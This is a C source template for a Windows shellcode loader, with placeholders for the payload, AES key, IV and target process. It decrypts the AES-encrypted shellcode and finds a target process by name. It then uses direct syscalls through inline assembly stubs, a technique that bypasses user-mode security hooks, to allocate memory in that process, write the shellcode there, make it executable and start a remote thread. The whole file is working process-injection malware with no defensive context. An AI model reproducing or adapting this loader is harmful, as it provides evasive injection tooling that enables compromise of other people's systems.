#include <windows.h>
#include <tlhelp32.h>
#include <bcrypt.h>

unsigned char shellcode[] = { ${SHELLCODE} };
unsigned char key[]       = { ${KEY} };
unsigned char iv[]        = { ${IV} };

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((s) >= 0)

static DWORD ssn_NtAllocateVirtualMemory;
static DWORD ssn_NtWriteVirtualMemory;
static DWORD ssn_NtProtectVirtualMemory;
static DWORD ssn_NtCreateThreadEx;

static DWORD resolve_ssn(const char *name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    BYTE *fn = (BYTE *)GetProcAddress(ntdll, name);
    if (!fn) return 0;
    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8)
        return *(DWORD *)(fn + 4);
    return 0;
}

__attribute__((naked, noinline))
static NTSTATUS SysNtAllocateVirtualMemory(HANDLE h, PVOID *ba, ULONG_PTR zb,
                                            PSIZE_T rs, ULONG at, ULONG pr) {
    __asm__(
        "movq %rcx, %r10\n\t"
        "movl ssn_NtAllocateVirtualMemory(%rip), %eax\n\t"
        "syscall\n\t"
        "ret"
    );
}

__attribute__((naked, noinline))
static NTSTATUS SysNtWriteVirtualMemory(HANDLE h, PVOID ba, PVOID buf,
                                         SIZE_T n, PSIZE_T written) {
    __asm__(
        "movq %rcx, %r10\n\t"
        "movl ssn_NtWriteVirtualMemory(%rip), %eax\n\t"
        "syscall\n\t"
        "ret"
    );
}

__attribute__((naked, noinline))
static NTSTATUS SysNtProtectVirtualMemory(HANDLE h, PVOID *ba, PSIZE_T rs,
                                           ULONG np, PULONG op) {
    __asm__(
        "movq %rcx, %r10\n\t"
        "movl ssn_NtProtectVirtualMemory(%rip), %eax\n\t"
        "syscall\n\t"
        "ret"
    );
}

__attribute__((naked, noinline))
static NTSTATUS SysNtCreateThreadEx(PHANDLE th, ACCESS_MASK da, PVOID oa,
                                     HANDLE ph, PVOID sr, PVOID arg, ULONG cf,
                                     SIZE_T zb, SIZE_T ss, SIZE_T mss, PVOID al) {
    __asm__(
        "movq %rcx, %r10\n\t"
        "movl ssn_NtCreateThreadEx(%rip), %eax\n\t"
        "syscall\n\t"
        "ret"
    );
}

static void AESDecrypt(unsigned char *data, DWORD data_len,
                       unsigned char *k, unsigned char *iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    ULONG cbResult = 0;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, k, 32, 0);
    BCryptDecrypt(hKey, data, data_len, NULL, iv, 16,
                  data, data_len, &cbResult, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
}

static DWORD FindPid(const char *procName) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (lstrcmpiA(pe.szExeFile, procName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

int main() {
    ssn_NtAllocateVirtualMemory = resolve_ssn("NtAllocateVirtualMemory");
    ssn_NtWriteVirtualMemory    = resolve_ssn("NtWriteVirtualMemory");
    ssn_NtProtectVirtualMemory  = resolve_ssn("NtProtectVirtualMemory");
    ssn_NtCreateThreadEx        = resolve_ssn("NtCreateThreadEx");

    if (!ssn_NtAllocateVirtualMemory || !ssn_NtWriteVirtualMemory ||
        !ssn_NtProtectVirtualMemory  || !ssn_NtCreateThreadEx)
        return 1;

    AESDecrypt(shellcode, sizeof(shellcode), key, iv);

    DWORD pid = FindPid("${TARGET_PROCESS}");
    if (!pid) return 1;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return 1;

    SIZE_T sc_len = sizeof(shellcode);
    PVOID addr    = NULL;
    SIZE_T region = sc_len;
    if (!NT_SUCCESS(SysNtAllocateVirtualMemory(hProc, &addr, 0, &region,
                                                MEM_COMMIT | MEM_RESERVE,
                                                PAGE_READWRITE))) {
        CloseHandle(hProc);
        return 1;
    }

    SIZE_T written = 0;
    SysNtWriteVirtualMemory(hProc, addr, shellcode, sc_len, &written);

    PVOID  protAddr   = addr;
    SIZE_T protRegion = sc_len;
    ULONG  oldProt    = 0;
    SysNtProtectVirtualMemory(hProc, &protAddr, &protRegion,
                               PAGE_EXECUTE_READ, &oldProt);

    HANDLE hThread = NULL;
    SysNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProc,
                        addr, NULL, 0, 0, 0, 0, NULL);

    CloseHandle(hProc);
    return 0;
}
